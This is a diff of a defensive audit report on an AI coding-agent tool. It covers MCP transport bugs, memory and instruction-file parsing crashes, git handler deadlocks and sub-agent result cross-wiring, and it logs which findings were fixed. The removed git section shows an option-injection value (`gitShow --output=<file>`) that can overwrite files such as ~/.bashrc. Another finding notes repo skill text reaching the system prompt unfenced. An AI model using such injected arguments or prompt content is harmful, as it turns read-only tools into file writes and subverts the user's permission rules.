-- **Failure scenario:** `<repo>/.sugar-crush/memory/project/a.md` is git-visible by design and read with no trust gate (`ProjectMemoryWriter::forRoot()`). Either of two ordinary hand edits breaks it:
-  - `createdAt: 2024-01-01` unquoted, which Symfony parses to an int, gives `TypeError: DateTimeImmutable::__construct(): Argument #1 must be of type string, int given`.
-  - A missing `type:` gives `Undefined array key` and then `TypeError: MemoryEntry::new(): Argument #1 ($type) must be of type string, null given`.
-
-  Neither is an `\Exception`. The error escapes `list()` → `MemoryBlock::capture()` → `Runtime::memorySnapshot()` → `systemPromptSections()`. Live result: every prompt in that checkout prints `DateTimeImmutable::__construct(): Argument #1 ($datetime) must be of type string, int given` and exits 1. `/memory list|search` break the same way. The parse is also fragile in two other ways:
-  - `explode('---', $raw, 3)` splits on the first `---` anywhere, so a tag containing `---` makes the entry unreadable and it is silently dropped.
-  - A string `tags:` value causes a `TypeError` for `array $tags`.
-- **Fix:**
-  - Catch `\Throwable` and record a skip.
-  - Validate each field with type checks, and accept int timestamps via `'@' . $ts`.
-  - Split the frontmatter with the same anchored `^---\s*\n(.*?)\n---\s*\n` regex the skill and memory importers use.
-  - Expose skipped files to `/doctor`.
-- **Test:** `MemoryStoreTest::testAMalformedEntryIsSkippedNotFatal`, with a data provider over unquoted dates, missing `type`, `tags: "x"`, a tag containing `---`, and a non-mapping frontmatter. Assert that `list()` returns the valid siblings and `MemoryBlock::capture()` renders.
 
 #### 15d-05 — `project` scope in the home store is global, so "project" notes leak into every other project's system prompt
 - **Severity:** Medium · **Confidence:** Verified by repro (`r10.php`)
@@ -21037,19 +20778,6 @@ This report is final. What was read, what was only skimmed, and how each open le
 ---
 
 ### C. Instruction files and prompt-wide encoding/size
-
-#### 15d-08 — Any non-UTF-8 byte in CLAUDE.md, AGENTS.md, a forced instruction, a rule, a memory note or a skill body makes every provider request throw
-- **Severity:** High (any legacy-encoded or binary-matched file bricks the project) · **Confidence:** Verified by repro (`r2.php`)
-- **Where:** `src/Context/InstructionFileLoader.php:264-265`, `:543-546` (raw `file_get_contents`); `src/Runtime.php:3037-3038` (only `PromptFence::escape()`, which is byte-oriented by design); `src/Providers/SglangProvider.php:649` / `CustomProvider.php:195` (`'json' => $params`, Guzzle `Utils::jsonEncode`, which throws)
-- **Failure scenario:** A Latin-1 `CLAUDE.md` containing `Caf\xe9` produces a 5,423-byte prompt with `mb_check_encoding` false. `GuzzleHttp\Utils::jsonEncode([... 'content' => $prompt])` then throws `InvalidArgumentException: json_encode error: Malformed UTF-8 characters`. Every turn in that checkout fails. The same applies to:
-  - an `instructions: ["docs/*"]` glob that matches a binary;
-  - rule bodies (`RuleLoader::readRule()`);
-  - skill bodies;
-  - repo-map package descriptions (partly guarded: `oneLine()`'s `/u` returns null, which becomes `''`).
-
-  Only `EnvironmentBlock::utf8Safe()` (`:884-905`) scrubs, and it covers only its own block. `MemoryBlock::oneLine()` has the inverse problem: `preg_replace('/\s+/u')` on invalid UTF-8 returns null, so the note silently renders as an empty `- [pattern] ` line.
-- **Fix:** Apply one scrub at the single assembly fold, `Runtime::assembleSections()`, using the same `?`-substitution and trailing notice that `EnvironmentBlock::utf8Safe()` uses (or `mb_scrub`), and report which section was scrubbed. Optionally also scrub per loader so the notice names the file.
-- **Test:** `BaseSystemPromptTest::testANonUtf8InstructionFileStillProducesAnEncodableRequest`. Plant a Latin-1 CLAUDE.md and assert `mb_check_encoding($prompt)` and that `Utils::jsonEncode` does not throw.
 
 #### 15d-09 — CLAUDE.md, AGENTS.md and forced instruction files have no size cap; a 3 MB file goes into every request whole
 - **Severity:** Medium · **Confidence:** Verified by repro (`r9.php`: a 3,080,000-byte AGENTS.md gives a 3,085,385-byte system prompt with no notice)
@@ -21251,10 +20979,7 @@ This report is final. What was read, what was only skimmed, and how each open le
 
 | ID | Sev | Conf | Title | Location |
 |---|---|---|---|---|
-| 15d-01 | High | Repro (CLI) | Mistyped SKILL.md frontmatter → uncaught TypeError at launch (untrusted clone); a mistyped `paths` item makes Edit/Write report failure after writing | `SkillRegistry.php:366-384`, `SkillManager.php:97-99`, `SkillLoader.php:651-659` |
-| 15d-02 | High | Repro | Repo skill descriptions enter the prompt unfenced, unescaped, uncapped and multi-line; the path nudge puts them inside `<system-reminder>` | `SkillMatcher.php:65-70`, `SkillPathNudge.php:297-311` |
-| 15d-04 | High | Repro (CLI) | Malformed memory file → TypeError on every turn (`catch (\Exception)` only) | `MemoryStore.php:506-535` |
-| 15d-08 | High | Repro | Non-UTF-8 instruction/rule/skill/memory bytes → Guzzle json_encode throws on every request | `InstructionFileLoader.php:264`, `Runtime.php:3037` |
+| 15d-02 | High | Repro | Repo skill descriptions enter the prompt unfenced, unescaped, uncapped and multi-line; the path nudge puts them inside `<system-reminder>`. Partly fixed (`a2d3dfcf3`: escaped, one-line, capped); remaining: no fenced section, no source badge | `SkillMatcher.php:65-70`, `SkillPathNudge.php:297-311` |
 | 15d-03 | Medium | Repro | Project `.sugar-crush/skills` shadows the user's own skills and built-ins silently; contradicts SKILLS.md | `SkillLoader.php:721-739` |
 | 15d-05 | Medium | Repro | Home-store `project` notes are global → injected into every repo's prompt | `MemoryBlock.php:213-229`, `Chat.php:12534` |
 | 15d-09 | Medium | Repro | No size cap on CLAUDE.md/AGENTS.md/forced/imports (3 MB inlined); skill budgets inert | `Runtime.php:3009-3040` |
@@ -21341,6 +21066,16 @@ This report is final. What was read, what was only skimmed, and how each open le
 - **Dropped KeywordTrigger lead:** `r15.php`.
 - **Scratch HOMEs:** `home1/`, `home11/`.
 
+---
+
+### Fixed since audit
+
+These findings were fixed on master after the audit. Their sections and table rows were removed; the coverage and repro lists above still name them. 15d-02 is only partly fixed and stays above with a **Remaining** note.
+
+- **15d-01** Mistyped SKILL.md frontmatter crashed sugar-crush at launch — fixed on master in `d1c1822a9` (mistyped skills are skipped and reported).
+- **15d-04** One malformed memory file broke every turn — fixed on master in `d26c38cdd`. Residual: skipped notes are announced only in the prompt; there is no `/memory` or `/doctor` display of them.
+- **15d-08** A non-UTF-8 byte in an instruction, rule, memory or skill file made every request throw — fixed on master in `218384747` (scrub at load time).
+
 
 ---
 
@@ -21361,56 +21096,6 @@ Repro scripts live in `/home/sites/crush-research-repos/_audit-scratch/15e/` (ea
 ---
 
 ### A. MCP transports
-
-#### MCP-1 — The stdio MCP client cannot talk to the reference TypeScript or Python SDK servers: empty PHP arrays go on the wire as JSON `[]`, not `{}`
-- **Severity:** Critical (MCP stdio is the main MCP transport; it is silently non-functional against both official SDKs)
-- **Confidence:** Verified-by-repro
-- **Where:** `sugar-mcp/src/StdioMcpServer.php:268-288` (handshake), `:376-379` (tools/call), `sugar-mcp/src/McpMessage.php:209` (`json_encode($payload)` with no object coercion). The sugar-crush wrapper `sugar-crush/src/MCP/StdioMcpServer.php:63-71` delegates to it unchanged.
-- **Code:**
-  ```php
-  $response = $this->request('initialize', [
-      'protocolVersion' => self::PROTOCOL_VERSION,
-      'capabilities' => [],                 // -> "capabilities":[]
-      'clientInfo' => $this->clientInfo,
-  ], $deadline);
-  if ($response === null || (!$response->resultSet && $response->error === null)) { ...throw }
-  $this->notify('initialized', null, $deadline);          // spec name is notifications/initialized
-  $listResponse = $this->request('tools/list', [], $deadline);   // -> "params":[]
-  ...
-  $response = $this->request('tools/call', ['name' => $toolName, 'arguments' => $args]); // $args === [] -> "arguments":[]
-  ```
-- **What happens (measured):**
-  - `@modelcontextprotocol/server-everything` 2026.8.31 (SDK 1.31.0): `initialize` comes back as an **error** (`-32603 ... params.capabilities expected object, received array`). The client accepts an error response as a successful start, because the guard only rejects "no result AND no error". `tools/list` with `"params":[]` gets **no response with an id at all**, so `start()` waits the full start timeout (60 s default; 30.1 s with a 30 s timeout in the repro) and ends with **0 tools**. A zero-argument `tools/call` returns `-32603 expected record, received array`.
-  - Python `mcp` FastMCP server: `initialize` returns `-32602 Invalid request parameters`; `tools/list` with `[]` produces only an "Internal Server Error" log notification and no id-bearing reply. Through the client: start took 20.1 s (timeout), **0 tools**, and both `ping()` and `echo()` returned `{"error":"Tool call failed"}`.
-  - The same handshake with `{}` works on both servers (raw wire test, same script).
-  - The notification name is also wrong: `initialized` rather than `notifications/initialized`. Python tolerates it; the TS SDK ignores it, so `oninitialized` never fires.
-- **User impact:** every `.mcp.json` stdio server built on the official SDKs (that is, most of them) shows up as "started" with no tools after blocking launch for up to 60 s per server. Nothing is reported, because a runtime start failure is skipped on purpose (`McpClient::startServer` `:356-360`), and this one doesn't even throw.
-- **Docs contradicted:** `docs/MCP.md:132` lists Stdio as "Works here: **yes**", and `docs/MCP.md:205-215` gives `npx -y @spences10/mcp-searxng-ultimate` (an official-SDK server) as the worked example. `docs/MCP.md:293-300` says the `/mcp` inventory shows ` · up N tools` for a running stdio child. Here it shows ` · up 0 tools`.
-- **Fix:** encode empty maps as objects: `'capabilities' => new \stdClass()`, omit `params` for `tools/list` (or pass `new \stdClass()`), and send `'arguments' => $args === [] ? new \stdClass() : $args`. More generally, make `McpMessage::toJson()` emit `params` as an object when it is an empty array. Send `notifications/initialized`. Treat an `initialize` reply carrying `error` as a start failure and include `error.message` in the exception.
-- **Test:** an integration test (gated on `node`) that spawns `server-everything stdio` through `SugarCraft\Crush\MCP\StdioMcpServer` and asserts `count(listTools()) > 0`, start time < 5 s, and that a no-arg tool call succeeds. Also a unit test on `McpMessage::request('x', 'tools/list', [])->toJson()` asserting `"params":{}` (or that params is absent).
-- **Repro:** `mcp_everything.php`, `mcp_py.php`, `pyserver.py` (plus the inline raw-wire `printf | node` / `uv run` commands).
-
-#### MCP-2 — `HttpMcpServer` cannot complete a Streamable HTTP handshake (no `Accept` header, no session id, same `[]` encoding)
-- **Severity:** High
-- **Confidence:** Verified-by-repro (406). The session-id and SSE-body points are Verified-by-reading.
-- **Where:** `sugar-crush/src/MCP/HttpMcpServer.php:34-41`, `:108-119`, `:148-160`
-- **Code:**
-  ```php
-  $this->rpc('initialize', ['protocolVersion' => '2024-11-05', 'capabilities' => [], ...]);
-  $response = $this->rpc('tools/list', []);
-  ...
-  return $this->httpClient->post($this->url, ['json' => [... 'params' => $params], 'headers' => $this->requestHeaders()]);
-  ```
-- **What happens:** against `server-everything streamableHttp`, `start()` fails with `406 Not Acceptable: Client must accept both application/json and text/event-stream`. Even with that fixed:
-  - the `Mcp-Session-Id` response header from `initialize` is never captured or sent back, so stateful servers reject `tools/list` (`Bad Request: No valid session ID`);
-  - `notifications/initialized` is never sent;
-  - a `text/event-stream` response body is `json_decode`d and treated as "invalid response";
-  - the `initialize` reply (including an error) is ignored entirely;
-  - the same `"capabilities":[]` / `"params":[]` encoding as MCP-1 applies.
-- **Docs contradicted:** `docs/MCP.md:133` lists HTTP as "Works here: **yes**" ("stateless POSTs"). The worked example `docs/MCP.md:211-213` (`context7`, `exa`, `gh-grep` at `…/mcp`) names Streamable HTTP endpoints, which are exactly the servers that answer 406 to a request with no `Accept`. `docs/MCP.md:297` documents a ` · ready N tools` row "whose handshake completed".
-- **Fix:** send `Accept: application/json, text/event-stream`. Store `Mcp-Session-Id` and replay it on every request. Send `notifications/initialized`. Parse SSE `data:` frames when `Content-Type` is `text/event-stream`. Encode empty maps as `{}`. Check the `initialize` result.
-- **Test:** a node-gated integration test that starts `server-everything streamableHttp` on an ephemeral port and asserts tools > 0. Also a Guzzle `MockHandler` test asserting the `Accept` header and the session-id echo.
-- **Repro:** `mcp_http.php` (start the server with `PORT=37411 node .../index.js streamableHttp`).
 
 #### MCP-3 — `ClaudeCodeMcpClient::callTool()` gives up after about 1 s, so any `claude-mcp` tool that runs longer than a second fails
 - **Severity:** Medium (the `claude-mcp` transport is double opt-in, but when enabled it is unusable for real tools such as Bash, Grep, and Task)
@@ -21436,55 +21121,17 @@ Repro scripts live in `/home/sites/crush-research-repos/_audit-scratch/15e/` (ea
 - **Fix:** `continue` on a null parse; only give up on EOF or the deadline. Optionally log the line into the stderr tail for diagnostics.
 - **Test:** a fake PHP MCP server that writes `"hello\n"` before every response; assert that start succeeds and tools are listed.
 
-#### GIT-1 — GitMcpServer handlers pass model-controlled values in option position: `gitShow(ref: "--output=/path")` writes an arbitrary file
-- **Severity:** High (it turns "read-only" git tools into arbitrary file writes, bypassing whatever permission rule allowed a read-only `mcp__git__gitShow`)
-- **Confidence:** Verified-by-repro
-- **Where:** `sugar-crush/src/MCP/GitCommandHandlers.php:210` (`['git','show','--format=...','--no-patch',$ref]`), `:404` (`array_merge(['git','add'], $paths)`), `:486` (`git revert $commit`), `:527` (`git reset --mode $commit`), `:625` (`git branch $name`), `:101` (`git config --get $key`), and the checkout, worktree, and lfs arms. None of them insert `--` or reject a leading `-`.
-- **Repro result:** `gitShow('--output=<scratch>/pwned.txt')` returned success and **created the file**, containing `7b2a357…|a@b|a|2026-10-01…`. Any path the user can write to (for example `~/.bashrc` or `.git/hooks/pre-commit`) can be overwritten with attacker-influenced bytes, because the commit subject is controlled by whoever wrote the commit. The other arms allow `git add --force/-A`, `git revert --abort`, and similar.
-- **Docs make it worse:** the only rules example in `docs/PERMISSIONS.md:144-152` is `Bash: ask`, `mcp__git__*: allow`, `Write: deny`. A user who copies it believes file writes are denied, but `mcp__git__gitShow(ref: "--output=<file>")` is auto-allowed and writes the file. `docs/MCP.md:94` / `:134` describe the git transport as in-process with a `path` that is "omitted → this project". Nothing says the model can point it elsewhere.
-- **Dispatch detail:** `GitMcpServer::callTool()` `:430` spreads the model's arguments straight onto the handler as named arguments (`$this->handlers->$method(...$args)`). The handler signatures match the advertised schemas today, so no hidden parameter is exposed. But no layer validates any value: every string reaches `proc_open` argv as written.
-- **Related (same root cause, Verified-by-reading):** every tool takes a model-supplied `path` (`GitMcpServer.php` schemas, `:51-290`) that overrides the configured `.mcp.json` `path` (`execGit()` `:1119`: `$cwd ?? $this->cwd ?? getcwd()`), with no containment to the project root. The model can run `gitReset(mode: hard)`, `gitBranchDelete`, or `gitCommit` in **any** repository on disk.
-- **Fix:** reject a leading `-` in every positional parameter (refs, branch names, keys, patterns, paths), or place `--end-of-options` / `--` correctly (`git show --format=… --no-patch --end-of-options <ref>`; `git add -- <paths>`). Contain the per-call `path` under the configured repo root (`ContainedPath`).
-- **Test:** for each handler, a data provider of `--output=/tmp/x`, `--force`, and `-A` that asserts failure and no file created. Also `path: '/'` and `path: '../other'` should be refused.
-- **Repro:** `git_handlers.php` + `gitrepo/`
-
-#### GIT-2 — `execGit()` reads stdout to EOF before reading stderr, so a git command with >64 KiB of stderr (for example a chatty pre-commit hook) deadlocks forever
-- **Severity:** High (an unbounded hang of the turn or TUI; no timeout exists)
-- **Confidence:** Verified-by-repro. The hang is reproduced; the cause is the classic pipe deadlock, established by reading the code.
-- **Where:** `sugar-crush/src/MCP/GitCommandHandlers.php:1177-1183`
-- **Code:**
-  ```php
-  fclose($pipes[0]);
-  $stdout = stream_get_contents($pipes[1]);   // blocks until git exits
-  fclose($pipes[1]);
-  $stderr = stream_get_contents($pipes[2]);   // never reached while git is blocked writing stderr
-  ```
-- **Repro:** a repo whose `pre-commit` hook writes 300 KB to stderr. `gitCommit('msg')` never returned and was killed by `timeout 20` (exit 124). This repo's own Caliber pre-commit hook, and any hook running phpunit, php-cs-fixer, or eslint, easily exceeds 64 KiB.
-- **Also:** the env is replaced with only `PATH` and `HOME` (`:1150-1153`), which drops `SSH_AUTH_SOCK`, `GPG_TTY`, `GNUPGHOME`, `LANG`, and `GIT_*`. Signed commits (`commit.gpgsign=true`) and SSH remotes fail, and hooks that need the environment misbehave.
-- **Fix:** drain both pipes with `stream_select` (non-blocking) or redirect stderr to a temp file. Add a wall-clock timeout with a terminate ladder (`BoundedShutdown`). Pass `getenv()` filtered rather than a two-key env.
-- **Test:** a fixture repo with a hook writing 300 KB to stderr; assert that `gitCommit` returns within N seconds and that the failure or success carries the stderr tail.
+#### MCP-9 — Empty maps nested inside a tool's own arguments still go on the wire as `[]`
+- **Severity:** Medium (same class as the fixed MCP-1, one level down)
+- **Confidence:** Verified-by-reading
+- **Where:** `sugar-mcp/src/StdioMcpServer.php:503` and `sugar-crush/src/MCP/HttpMcpServer.php:199`: `'arguments' => $args === [] ? new \stdClass() : $args`. MCP-1's fix (`44ba1a20b`, `b80b267f1`) coerces only the top-level arguments object. A decoded `{"filter":{}}` reaches PHP as `['filter' => []]` and is re-encoded as `"filter":[]`.
+- **What happens:** a tool whose schema declares an object property (a filter, an options bag, a headers map) and receives it empty fails validation on official-SDK servers (`expected object, received array`), so the call errors although the model sent valid JSON.
+- **Fix:** keep the model's arguments as decoded objects end to end (`json_decode` without `assoc`, or `JSON_OBJECT_AS_ARRAY` off for the MCP path), or walk the arguments against the tool's `inputSchema` and turn each empty array whose schema type is `object` into `stdClass`.
+- **Test:** call a server-everything tool with a nested empty object argument and assert the wire bytes carry `{}` and the call succeeds.
 
 ---
 
 ### B. Sessions and persistence
-
-#### SES-1 — `/rewind` restores a checkpoint that already contains the prompt being undone: the prompt is left dangling in history AND re-seeded into the input box
-- **Severity:** Medium
-- **Confidence:** Verified-by-repro
-- **Where:** checkpoint capture `src/Chat.php:7964-7990` (`'messages' => $next->history` where `$next->history = [...$baseHistory, ...$newTurnMessages]` and `$newTurnMessages` ends with `Message::user($text)`, `:7470`); restore `src/Chat.php:12358-12385`
-- **Repro output:**
-  ```
-  checkpoint messages: 1   cp user: fix the login bug
-  after rewind:
-    user: fix the login bug
-    user: /rewind
-    assistant: Rewound 1 messages to checkpoint 0. ...
-  inputBuf: 'fix the login bug'
-  ```
-- **Impact:** `/rewind` removes only the reply, not the exchange. The model's next turn sees two consecutive user messages (the undone prompt, then the `/rewind` line). If the user presses Enter on the re-seeded draft, the prompt is sent twice. The "Rewound N messages" count is off by one exchange. `RewindCommandTest::testRewindRestoresTheDraftTheSubmitCaptured` asserts the draft but never asserts that the history *excludes* the prompt, which is why this passes.
-- **Fix:** checkpoint `$baseHistory` (the pre-turn history) rather than `$next->history`. Alternatively, on restore, drop the trailing user message when it equals the restored `inputBuf`.
-- **Test:** submit → rewind; assert `history` contains no `user` row equal to the restored draft.
-- **Repro:** `rewind.php`
 
 #### SES-2 — `forkSession()` copies only the legacy `messages`/`tool_calls` tables, which nothing writes. The fork has no transcript, no checkpoints, no meta, and inherits the parent's **name**.
 - **Severity:** Medium. It is part of the root cause of the known "/fork ignores history" item (#30), plus new consequences.
@@ -21574,35 +21221,13 @@ Repro scripts live in `/home/sites/crush-research-repos/_audit-scratch/15e/` (ea
 
 ### E. Forked sub-agents (workflows and Task fan-out)
 
-#### AG-1 — Forked sub-agents share the parent's MCP connections: concurrent MCP calls from parallel agents get each other's results
-- **Severity:** High. Tool results are silently swapped between agents, and each agent then acts on another agent's data. It needs two or more sub-agents running at once that call the same MCP server; that is the normal shape of a parallel workflow stage or a multi-Task fan-out.
-- **Confidence:** Verified-by-repro at the transport level (the product's own `StdioMcpServer`/`McpClient` objects, used across `pcntl_fork()` exactly as the pool uses them). That the live path reaches it is Verified-by-reading.
-- **Where:**
-  - `sugar-mcp/src/StdioMcpServer.php:111` (`private int $nextId = 0`) and `:416` (`$id = (string) $this->nextId++`): the id counter is copied into every child.
-  - `src/Agents/AgentWorkerPool.php:761-792`: the fork branch runs `runStreaming()` in the child, against objects built in the parent.
-  - `src/Agents/EngineExecutor.php:173-174`: `$request->tools ?? $this->engine->tools()`.
-  - `src/Tools/BuiltIn/TaskTool.php:450`: `$granted ?? $engine->tools()`.
-  - `src/Cli/Bootstrap.php:6928`: `...self::mcpTools($root)` puts the bridges into the engine roster.
-  - `src/Cli/Bootstrap.php:6262-6281`: `mcpClient()` is memoised per pid, but the bridges a child inherits still hold the parent's client.
-  - `Runtime::executeConcurrently` `src/Runtime.php:1853` forks one child per parallel Task call.
-- **Mechanism:** each forked child inherits the parent's stdio pipes to the MCP server and the same `nextId`. N children calling at once all write `{"id":"3",…}` to one stdin pipe and race to read one stdout pipe. Each takes the first line it sees, and since every request carries the same id, each accepts whatever line arrives. Guzzle-based `type: http` servers behave the same way, because a keep-alive connection the parent opened is reused by every child over the inherited socket.
-- **Repro output:**
-  ```
-  mcp_fork.php (3 forked children, one shared StdioMcpServer)
-  parent call: reply-for-parent (req id 2)
-  child2 (0.4s): reply-for-child0 (req id 3)
-  child0 (0.9s): reply-for-child1 (req id 3)
-  child1 (1.7s): reply-for-child2 (req id 3)
-  fork_http.php (Guzzle client used once in the parent, then 3 forked children)
-  child1 peer=34384 got echo=child0
-  child2 peer=34384 got echo=child1
-  child0 peer=34384 got echo=child2
-  ```
-  Every child received a sibling's answer. A child exiting normally (`exit(0)`, as the pool's worker does) did **not** stop the shared server: `mcp_fork_exit.php` showed the parent still served afterwards. The damage is the cross-wiring alone.
-- **Scenario:** `examples/workflows/lint-then-fix.yaml`'s parallel `fix` stage, or "spawn three Task agents to look up these tickets", with a trusted `.mcp.json` server (database, issue tracker, search). Agent A receives B's query result, reports it as its own, and may edit code from it. Nothing errors.
-- **Fix:** do not use parent-owned MCP transports in a forked child. Either (a) after fork, give the child its own `McpClient` (re-spawn the servers, or for HTTP build a fresh Guzzle client), or (b) proxy child MCP calls to the parent over the existing IPC channel, so one process owns each server and request ids stay unique. At minimum, record `getmypid()` in `StdioMcpServer` and in `HttpMcpServer`'s client, and refuse calls from a different pid with a clear error instead of cross-wiring silently.
-- **Test:** a fake stdio MCP server whose `slow` tool echoes its argument after a random delay. Run two `AgentWorkerPool` agents through `EngineExecutor` whose scripted provider calls `mcp__fake__slow(n=<agent>)`, and assert each agent's result contains its own `n`.
-- **Repro:** `mcp_fork.php`, `fake_mcp_server.php`, `mcp_fork_exit.php`, `fork_http.php` + `ka_server.py` (`python3 ka_server.py 37422 &` first).
+#### AG-4 — `AgentManager::executeSubAgent()` swallows provider errors the way 15a A1 did: the sub-agent completes with empty output and no error
+- **Severity:** High (same class as 15a A1; latent today, because `executeSubAgent()` has no `src/` caller, per `Renderer.php:167` and the coverage note below)
+- **Confidence:** Verified-by-reading (found during the A1 fix)
+- **Where:** `src/Agents/AgentManager.php:678` onward. In the streaming loop (around `:816-834`), `$errorChunk = $response` is recorded and then only used to decide whether to retry. After the loop `$errorChunk->errorMessage` is never read and nothing is thrown, so the sub-agent settles as completed. A1's fix (`ea81820fb`) changed `Runtime` only.
+- **What happens:** a 401, a 400, a bad model id or an in-stream error on a sub-agent's provider ends that sub-agent with empty or partial output, reported as success. A workflow stage or caller built on it then works from nothing, with no error shown.
+- **Fix:** after the retry loop, if `$errorChunk !== null`, fail the sub-agent with `errorMessage` (or throw a `ProviderException`), exactly as A1's fix does in `Runtime`.
+- **Test:** `tests/Integration/ProviderRetryWiringTest.php` already drives `executeSubAgent()`. Add a case with a 401 `MockHandler` and assert the sub-agent fails and carries the provider's message.
 
 #### AG-2 — One preset file in the Claude Code `tools:` spelling disables every agent preset in every tier
 - **Severity:** Low-Medium
@@ -21701,7 +21326,7 @@ The baseline item "only the first task of a stage runs" (`WorkflowEngine.php:106
 - **Test:** trust a root, change one server's `args`, rebuild the client; assert that server is refused, the unchanged ones start, and the refusal names the server.
 
 #### MCP-6 — `sugarcrush mcp auth login` cannot log in to an MCP server whose URL has a path (nearly all of them): discovery appends `/.well-known/…` after the path, and the registration endpoint cannot be supplied by hand
-- **Severity:** Low-Medium (the login half is unusable for path-bearing endpoints. The HTTP transport it serves is broken independently by MCP-2)
+- **Severity:** Low-Medium (the login half is unusable for path-bearing endpoints)
 - **Confidence:** Verified-by-repro (against `mcp.notion.com`, discovery only; nothing was registered)
 - **Where:** `src/MCP/OAuthLoopbackFlow.php:108` (`$wellKnown = rtrim($serverUrl, '/') . '/.well-known/oauth-authorization-server'`), `:121` (fails when `registration_endpoint` is missing; the positional operands override only the token and authorize URLs). The same construction appears in `src/Commands/McpAuthCommand.php:251`. `McpAuthCommand::fetchOAuthMetadata()` `:375-410` never checks the HTTP status.
 - **Repro (`oauth_discovery.php`):** `login('https://mcp.notion.com/mcp', <token-url>, <authorize-url>)` returns `✗ OAuth endpoints could not be discovered … exit code: 1`, even with both overrides passed. `curl`: `https://mcp.notion.com/.well-known/oauth-authorization-server` → 200, but `…/mcp/.well-known/oauth-authorization-server` → 401.
@@ -21753,7 +21378,7 @@ The baseline item "only the first task of a stage runs" (`WorkflowEngine.php:106
   1. `docs/TROUBLESHOOTING.md:136-139` says an unknown `type` makes startup "ordering-dependent: servers listed after it were never reached". `McpClient::startServers()` `src/MCP/McpClient.php:116-146` attempts every entry, collects failures, and throws once at the end. `docs/MCP.md:136` describes this correctly. The troubleshooting advice ("move the bad entry") is stale.
   2. `docs/WORKFLOWS.md:63,81,245-246,255-261` and `examples/workflows/lint-then-fix.yaml:19-20`: timeout and retries semantics that do not exist (WF-1).
   3. `docs/WORKFLOWS.md:113`: `{{agentName.results}}` for parallel agents (WF-3).
-  4. `docs/MCP.md:132-133,297`: Stdio/HTTP marked working (MCP-1, MCP-2). `docs/PERMISSIONS.md:144-152` pairs `mcp__git__*: allow` with `Write: deny` (GIT-1).
+  4. Resolved since the audit: the Stdio/HTTP "works" rows in `docs/MCP.md` and the `mcp__git__*: allow` + `Write: deny` example in `docs/PERMISSIONS.md` became true when MCP-1, MCP-2 and GIT-1 were fixed.
 - **Fix:** correct each one alongside its finding. Item 1 stands alone: delete the ordering paragraph.
 
 ---
@@ -21762,13 +21387,9 @@ The baseline item "only the first task of a stage runs" (`WorkflowEngine.php:106
 
 | ID | Severity | Confidence | Title |
 |---|---|---|---|
-| MCP-1 | Critical | Verified-by-repro | stdio MCP sends `[]` for empty maps; reference TS/Python SDK servers start with 0 tools after a 60 s block, and no-arg tools fail |
-| AG-1 | High | Verified-by-repro | Forked sub-agents (parallel workflow stages, Task fan-out) share the parent's MCP pipes, id counter and keep-alive sockets; concurrent MCP calls return each other's results |
-| MCP-2 | High | Verified-by-repro | Streamable HTTP MCP: 406 (no Accept), no Mcp-Session-Id, no SSE parsing |
-| GIT-1 | High | Verified-by-repro | Git MCP handlers allow option injection (`gitShow --output=` writes arbitrary files) and an uncontained per-call `path` |
-| GIT-2 | High | Verified-by-repro | `execGit` stdout-then-stderr read deadlocks on more than 64 KiB of stderr (hook output); no timeout; env stripped |
+| **AG-4** | High (latent) | Verified-by-reading | `AgentManager::executeSubAgent()` swallows provider errors like 15a A1 did: empty output, reported as success |
+| **MCP-9** | Medium | Verified-by-reading | Empty maps nested inside a tool's arguments still go on the wire as `[]` (MCP-1 fixed only the top level) |
 | MCP-3 | Medium | Verified-by-repro | `ClaudeCodeMcpClient` gives up after ~1 s per call; initialize sent as a notification |
-| SES-1 | Medium | Verified-by-repro | `/rewind` keeps the undone prompt in history and in the input box |
 | SES-2 | Medium | Verified-by-repro | `forkSession` copies dead tables (empty fork, no checkpoints, duplicate name; `--resume name` opens the parent) |
 | SES-3 | Medium | Verified-by-reading | No per-session writer lock; two TUIs clobber the transcript; checkpoint index and blob-intern races |
 | WF-1 | Medium | Verified-by-reading | Workflow/task `timeout` and `retries` are never enforced; stages have no wall-clock bound |
@@ -21789,7 +21410,7 @@ The baseline item "only the first task of a stage runs" (`WorkflowEngine.php:106
 | BG-2 | Low | Verified-by-reading | Background IPC directories never cleaned |
 | CLI-1 | Low | Verified-by-repro | `display_errors` not routed to stderr; a `mkdir()` warning precedes the headless JSON document |
 | AG-3 | Low | Verified-by-reading | `AgentManager` never forgets sub-agents; unbounded growth plus a per-frame scan |
-| DOC-1 | Low | Verified-by-reading | Doc drift: TROUBLESHOOTING startup ordering, plus doc halves of WF-1/WF-3/MCP-1/MCP-2/GIT-1 |
+| DOC-1 | Low | Verified-by-reading | Doc drift: TROUBLESHOOTING startup ordering, plus doc halves of WF-1/WF-3 |
 
 ---
 
@@ -21822,7 +21443,7 @@ The baseline item "only the first task of a stage runs" (`WorkflowEngine.php:106
 - `src/LSP/*`: dormant per the baseline; no live caller.
 - `src/Share/*`: a known stub (Part II #35).
 - `src/Agents/WorktreeManager.php`, `PathJail.php`, `PathJailConfig.php`, `TeamManager.php`, `Mailbox.php`, `Team*.php`: nothing outside `src/Agents/` constructs them (`grep 'new Mailbox|new TeamManager|new PathJail'`), so they are dormant (baseline §2.6).
-- `AgentManager::executeSubAgent()` `:678-940`: no `src/` caller (also noted at `src/Renderer.php:166-167`).
+- `AgentManager::executeSubAgent()` `:678-940`: no `src/` caller (also noted at `src/Renderer.php:166-167`). AG-4 was found in it later, during the 15a A1 fix.
 - `ForeignAgentPresetRegistry.php`: function list only.
 - `src/Events/*`: not reached.
 - `McpForeignTranslate.php`: used only by `mcp import`, which prints and writes nothing.
@@ -21860,3 +21481,16 @@ The baseline item "only the first task of a stage runs" (`WorkflowEngine.php:106
 | `fdleak.php` | lead 5 | |
 
 `ps` after the last run showed no leftover node, python, php, MCP or daemon processes.
+
+---
+
+### Fixed since audit
+
+These findings were fixed on master after the audit. Their sections and table rows were removed; the coverage and repro lists above still name them.
+
+- **MCP-1** stdio MCP sent `[]` for empty maps; official TS/Python SDK servers started with 0 tools — fixed on master in `44ba1a20b` (+ `b80b267f1` for `claude-mcp` tool arguments). Residual: nested empty maps (MCP-9).
+- **MCP-2** Streamable HTTP MCP: no `Accept`, no `Mcp-Session-Id`, no SSE — fixed on master in `72eaf4642`.
+- **GIT-1** Git MCP option injection (`gitShow --output=`) and an uncontained per-call `path` — fixed on master in `43fe9cd06`. Residual: checkout and reset cannot take `--end-of-options`.
+- **GIT-2** `execGit()` deadlock on more than 64 KiB of stderr; no timeout; env stripped — fixed on master in `4c341ef6a`. Residual: the git timeout cannot be configured from `.mcp.json`.
+- **SES-1** `/rewind` kept the undone prompt in history and in the input box — fixed on master in `abd65fd16`. Residual: checkpoints saved before the fix are restored by dropping a trailing user row that matches the restored draft.
